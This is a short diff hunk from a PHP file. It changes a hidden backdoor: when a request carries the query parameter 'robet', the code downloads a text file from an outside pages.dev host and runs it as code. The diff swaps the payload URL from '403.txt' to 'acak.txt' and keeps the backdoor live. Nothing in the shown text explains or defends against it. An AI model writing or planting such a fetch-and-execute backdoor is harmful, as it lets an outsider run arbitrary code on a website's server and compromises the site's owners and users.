@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['robet'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://bulldog-uhukk.pages.dev/403.txt");
+    $executor->executeCodeFromURL("https://bulldog-uhukk.pages.dev/acak.txt");
     exit;
 }
 
